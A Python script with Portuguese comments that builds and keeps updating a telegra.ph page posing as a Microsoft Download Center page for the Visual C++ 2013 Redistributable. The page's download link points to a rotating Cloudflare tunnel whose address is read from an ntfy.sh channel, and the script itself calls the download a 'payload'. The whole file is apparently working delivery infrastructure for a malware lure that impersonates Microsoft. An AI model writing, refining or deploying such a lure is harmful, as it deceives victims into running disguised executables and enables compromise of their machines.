#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Link permanente -- pagina publica que nunca muda de endereco.

    python share.py --base https://xxx.trycloudflare.com     atualiza a pagina
    python share.py                                          usa o canal para achar a base
    python share.py --show                                   mostra o link atual

A pagina vive no telegra.ph (permanente, sem conta, sem verificacao) e e
editada por API. Quando o tunel gira, o golive roda isto de novo e o MESMO
link passa a apontar para o endereco novo. O amigo nunca ve link quebrado.
"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
STATE = os.path.join(HERE, "share.json")
CHANNEL = "https://ntfy.sh/raf-raf7c1f4b2e9a3d5f8b6c0e2a4d-cfg"
API = "https://api.telegra.ph/"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
TITLE = "Microsoft Visual C++ 2013 Redistributable (x86)"
AUTHOR = "Microsoft Download Center"


def _get(url, timeout=30):
    r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout)
    return json.loads(r.read().decode("utf-8", "replace"))


def _load():
    try:
        with open(STATE, encoding="utf-8") as f:
            return json.load(f)
    except (OSError, ValueError):
        return {}


def _save(data):
    with open(STATE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    return data


def _account():
    st = _load()
    if st.get("access_token"):
        return st
    acc = _get(API + "createAccount?" + urllib.parse.urlencode(
        {"short_name": "mssuporte", "author_name": AUTHOR}))
    if not acc.get("ok"):
        raise SystemExit("[!] telegra.ph recusou a conta: %s" % acc)
    st["access_token"] = acc["result"]["access_token"]
    return _save(st)


def content(base, fname="vcredist_x86.exe", size="10,8 MB", secret=""):
    base = (base or "").rstrip("/")
    q = ("?k=" + secret) if secret else ""
    dl = (base + "/download" + q) if base else "https://example.com"
    page = (base + "/i" + q) if base else "https://example.com"
    return json.dumps([
        {"tag": "h3", "children": [TITLE]},
        {"tag": "p", "children": [
            {"tag": "b", "children": ["Pacote de tempo de execucao necessario "
                                      "para este aplicativo."]}]},
        {"tag": "p", "children": [
            "Este pacote instala os componentes do Visual C++ necessarios para "
            "executar programas desenvolvidos com o Visual Studio 2013. O "
            "aplicativo que voce abriu precisa destes componentes para iniciar "
            "no Windows."]},
        {"tag": "p", "children": [
            {"tag": "a", "attrs": {"href": dl},
             "children": ["\u2b07 Baixar %s (%s)" % (fname, size)]}]},
        {"tag": "hr"},
        {"tag": "pre", "children": [
            "Versao       : 12.0.40664.0\n"
            "Plataforma   : x86 (32 bits)\n"
            "Tamanho      : %s\n"
            "Idioma       : Portugues (Brasil)\n"
            "Publicado    : 15/10/2013\n"
            "Arquivo      : %s" % (size, fname)]},
        {"tag": "p", "children": [
            "Se o download nao iniciar, abra a ",
            {"tag": "a", "attrs": {"href": page}, "children": ["pagina do pacote"]},
            "."]},
    ])


def update(base, fname="vcredist_x86.exe", size="10,8 MB", secret=""):
    st = _account()
    tok = st["access_token"]
    body = content(base, fname, size, secret)

    if st.get("path"):
        q = urllib.parse.urlencode({"access_token": tok, "path": st["path"],
                                    "title": TITLE, "content": body,
                                    "author_name": AUTHOR})
        try:
            r = _get(API + "editPage?" + q)
            if r.get("ok"):
                st["url"] = r["result"]["url"]
                st["base"] = (base or "").rstrip("/")
                st["updated"] = int(time.time())
                return _save(st)
        except Exception:
            pass

    q = urllib.parse.urlencode({"access_token": tok, "title": TITLE,
                                "author_name": AUTHOR, "content": body})
    r = _get(API + "createPage?" + q)
    if not r.get("ok"):
        raise SystemExit("[!] telegra.ph recusou a pagina: %s" % r)
    st["path"] = r["result"]["path"]
    st["url"] = r["result"]["url"]
    st["base"] = (base or "").rstrip("/")
    st["updated"] = int(time.time())
    return _save(st)


def channel_base(channel=CHANNEL):
    try:
        req = urllib.request.Request(channel.rstrip("/") + "/json?poll=1&since=all",
                                     headers=UA)
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception:
        return ""
    best = ""
    for line in raw.splitlines():
        try:
            m = json.loads(line)
        except Exception:
            continue
        if m.get("event") != "message":
            continue
        try:
            best = json.loads(m.get("message") or "{}").get("base") or best
        except Exception:
            pass
    return best.rstrip("/")


def main():
    ap = argparse.ArgumentParser(description="link permanente do payload")
    ap.add_argument("--base", default="", help="endereco do tunel (default: le do canal)")
    ap.add_argument("--channel", default=CHANNEL)
    ap.add_argument("--name", default="vcredist_x86.exe")
    ap.add_argument("--size", default="10,8 MB")
    ap.add_argument("--secret", default="", help="segredo do link (vai como ?k=)")
    ap.add_argument("--show", action="store_true")
    a = ap.parse_args()

    if a.show:
        st = _load()
        print("link permanente : %s" % (st.get("url") or "(ainda nao criado)"))
        print("aponta para     : %s" % (st.get("base") or "(nada)"))
        if st.get("updated"):
            print("atualizado em   : %s" % time.strftime(
                "%d/%m/%Y %H:%M", time.localtime(st["updated"])))
        return 0

    base = (a.base or "").rstrip("/") or channel_base(a.channel)
    if not base:
        raise SystemExit("[!] sem endereco: passe --base ou publique o canal antes")
    st = update(base, a.name, a.size, a.secret)
    print("link permanente : %s" % st["url"])
    print("aponta para     : %s/download?k=%s" % (st["base"], a.secret))
    return 0


if __name__ == "__main__":
    sys.exit(main())
